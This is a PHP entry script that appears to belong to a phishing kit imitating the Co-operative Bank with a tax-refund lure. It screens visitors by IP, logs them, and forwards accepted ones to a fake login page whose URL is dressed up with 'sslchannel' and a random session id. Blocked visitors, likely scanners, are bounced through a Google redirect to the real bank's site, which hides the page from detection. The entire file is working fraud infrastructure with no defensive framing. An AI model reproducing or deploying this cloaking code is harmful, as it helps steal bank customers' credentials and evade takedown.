<?php
require_once("assets/includes/functions.php");

# Visitor IP range check

$ips = array(	$_SERVER['REMOTE_ADDR'],
				 );

$checklist = new IpBlockList( );
foreach ($ips as $ip ) {

	$result = $checklist->ipPass( $ip );

	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Login.php?sslchannel=true&form=Tax-Refund&sessionid=" . generateRandomString(80));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjY2ICzzpDIAhXHuhoKHapxChI&url=http%3A%2F%2Fwww.co-operativebank.co.uk%2F&usg=AFQjCNESma4u8Ae4mkYSDn4fAIReIMb_gA");
		die();
	}
	
}

?>